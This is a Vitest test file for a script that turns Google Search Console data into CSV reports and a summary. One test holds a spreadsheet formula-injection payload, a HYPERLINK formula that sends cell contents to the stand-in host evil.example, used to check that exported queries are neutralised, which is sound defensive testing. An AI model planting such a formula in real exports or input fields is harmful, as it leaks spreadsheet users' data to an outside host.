import { mkdtempSync, readFileSync, readdirSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import type { SearchAnalyticsBody, SearchAnalyticsRow, SitemapEntry } from '../../../scripts/lib/gsc/client'
import { parseCsvObjects } from '../../../scripts/lib/gsc/csv'
import { computeWindows, runSearchReport } from '../../../scripts/lib/gsc/search-report'
import { blockNetwork } from './no-network'

blockNetwork()

const DATE = '2026-10-01'

let dir: string
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'gsc-search-'))
})
afterEach(() => {
  rmSync(dir, { recursive: true, force: true })
})

const row = (key: string | undefined, clicks: number, impressions: number, position: number): SearchAnalyticsRow => ({
  keys: key === undefined ? undefined : [key],
  clicks,
  impressions,
  ctr: impressions ? clicks / impressions : 0,
  position,
})

const SITEMAP: SitemapEntry = {
  path: 'https://dropmarket.gg/sitemap.xml',
  lastSubmitted: '2026-09-01T00:00:00Z',
  lastDownloaded: '2026-09-30T04:00:00Z',
  isPending: false,
  isSitemapsIndex: false,
  type: 'sitemap',
  warnings: 3,
  errors: 1,
  contents: [{ type: 'web', submitted: 1025, indexed: 0 }],
}

function fakeClient(byDimension: Record<string, SearchAnalyticsRow[]> = {}) {
  const searchAnalytics = vi.fn(async (body: SearchAnalyticsBody) => {
    const key = (body.dimensions ?? []).join(',') || 'totals'
    const rows = byDimension[key] ?? []
    const start = body.startRow ?? 0
    return { rows: rows.slice(start, start + (body.rowLimit ?? rows.length)) }
  })
  const listSitemaps = vi.fn(async () => [SITEMAP])
  return { searchAnalytics, listSitemaps }
}

const quiet = { log: () => {} }

describe('computeWindows', () => {
  it('ends two days before today (GSC data lags) and spans 28 and 90 days inclusive', () => {
    expect(computeWindows('2026-10-01')).toEqual([
      { label: '28d', days: 28, startDate: '2026-09-02', endDate: '2026-09-29' },
      { label: '90d', days: 90, startDate: '2026-07-02', endDate: '2026-09-29' },
    ])
  })

  it('crosses a year boundary without drift', () => {
    const [w28] = computeWindows('2026-01-01')
    expect(w28.endDate).toBe('2025-12-30')
    expect(w28.startDate).toBe('2025-12-03')
  })
})

describe('runSearchReport', () => {
  it('queries totals, queries, pages, countries and devices for both windows', async () => {
    const client = fakeClient()
    await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })

    const bodies = client.searchAnalytics.mock.calls.map((c) => c[0])
    const dims = (w: string) =>
      bodies.filter((b) => b.startDate === (w === '28d' ? '2026-09-02' : '2026-07-02')).map((b) => (b.dimensions ?? []).join(',') || 'totals')
    for (const w of ['28d', '90d']) {
      expect(dims(w)).toEqual(expect.arrayContaining(['totals', 'query', 'page', 'country', 'device']))
    }
    for (const b of bodies) {
      expect(b.endDate).toBe('2026-09-29')
      expect(b.dataState).toBe('final')
    }
  })

  it('pages the query list with startRow until a short page', async () => {
    const queries = Array.from({ length: 5 }, (_, i) => row(`q${i}`, 10 - i, 100, 5))
    const client = fakeClient({ query: queries })
    await runSearchReport({ outDir: dir, date: DATE, today: DATE, queryPageSize: 3 }, { client, ...quiet })

    const queryCalls = client.searchAnalytics.mock.calls
      .map((c) => c[0])
      .filter((b) => b.dimensions?.join(',') === 'query' && b.endDate === '2026-09-29' && b.startDate === '2026-09-02')
    expect(queryCalls.map((b) => b.startRow ?? 0)).toEqual([0, 3])
    const csv = parseCsvObjects(readFileSync(join(dir, `search-28d-queries-${DATE}.csv`), 'utf8'))
    expect(csv).toHaveLength(5)
  })

  it('writes the top 100 queries by clicks', async () => {
    const queries = Array.from({ length: 150 }, (_, i) => row(`q${i}`, i, 1000, 30))
    const client = fakeClient({ query: queries })
    await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
    const csv = parseCsvObjects(readFileSync(join(dir, `search-28d-queries-${DATE}.csv`), 'utf8'))
    expect(csv).toHaveLength(100)
    expect(csv[0].query).toBe('q149')
  })

  it('keeps queries at average position 4–20, most impressions first', async () => {
    const client = fakeClient({
      query: [
        row('top3', 50, 500, 3.9),
        row('edge4', 1, 100, 4),
        row('mid', 2, 900, 12.34),
        row('edge20', 0, 300, 20),
        row('deep', 0, 800, 20.1),
      ],
    })
    await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
    const csv = parseCsvObjects(readFileSync(join(dir, `search-28d-queries-pos-4-20-${DATE}.csv`), 'utf8'))
    expect(csv.map((r) => r.query)).toEqual(['mid', 'edge20', 'edge4'])
    expect(csv[0].position).toBe('12.34')
  })

  it('neutralises query strings a spreadsheet would execute as formulas', async () => {
    const hostile = '=HYPERLINK("https://evil.example/?"&A2,"adopt me values")'
    const client = fakeClient({
      query: [row(hostile, 9, 90, 8), row('+1 pet value', 5, 50, 9), row('adopt me values', 1, 10, 10)],
    })
    await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
    for (const file of [`search-28d-queries-${DATE}.csv`, `search-28d-queries-pos-4-20-${DATE}.csv`]) {
      const queries = parseCsvObjects(readFileSync(join(dir, file), 'utf8')).map((r) => r.query)
      expect(queries).toContain(`'${hostile}`)
      expect(queries).toContain("'+1 pet value")
      expect(queries).toContain('adopt me values')
    }
  })

  it('writes totals with the window dates and rounded rates', async () => {
    const client = fakeClient({ totals: [{ clicks: 12, impressions: 3456, ctr: 0.0034722222, position: 14.567891 }] })
    await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
    const [t] = parseCsvObjects(readFileSync(join(dir, `search-28d-totals-${DATE}.csv`), 'utf8'))
    expect(t).toEqual({
      startDate: '2026-09-02',
      endDate: '2026-09-29',
      clicks: '12',
      impressions: '3456',
      ctr: '0.0035',
      position: '14.57',
    })
  })

  it('writes pages, countries and devices keyed by their dimension', async () => {
    const client = fakeClient({
      page: [row('https://dropmarket.gg/', 5, 50, 8)],
      country: [row('usa', 4, 40, 9)],
      device: [row('MOBILE', 3, 30, 7)],
    })
    await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
    const read = (n: string) => parseCsvObjects(readFileSync(join(dir, `search-28d-${n}-${DATE}.csv`), 'utf8'))[0]
    expect(read('pages').page).toBe('https://dropmarket.gg/')
    expect(read('countries').country).toBe('usa')
    expect(read('devices').device).toBe('MOBILE')
  })

  it('writes the sitemap status', async () => {
    const client = fakeClient()
    await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
    const [s] = parseCsvObjects(readFileSync(join(dir, `sitemaps-${DATE}.csv`), 'utf8'))
    expect(s).toMatchObject({
      path: 'https://dropmarket.gg/sitemap.xml',
      lastDownloaded: '2026-09-30T04:00:00Z',
      lastSubmitted: '2026-09-01T00:00:00Z',
      errors: '1',
      warnings: '3',
      submitted: '1025',
      indexed: '0',
    })
  })

  it('writes a short summary with both windows and the sitemap status', async () => {
    const client = fakeClient({
      totals: [{ clicks: 12, impressions: 3456, ctr: 0.0035, position: 14.5 }],
      query: [row('buy adopt me pets', 7, 700, 9)],
    })
    const result = await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
    const md = readFileSync(result.summaryPath, 'utf8')
    expect(md).toContain('28 days')
    expect(md).toContain('90 days')
    expect(md).toContain('buy adopt me pets')
    expect(md).toMatch(/lastDownloaded|Last downloaded/i)
    expect(md).toMatch(/errors/i)
    expect(readdirSync(dir).length).toBeGreaterThan(10)
  })

  it('still writes every file when Search Console has no data yet', async () => {
    const client = fakeClient()
    const result = await runSearchReport({ outDir: dir, date: DATE, today: DATE }, { client, ...quiet })
    expect(readFileSync(result.summaryPath, 'utf8')).toMatch(/no data/i)
  })
})
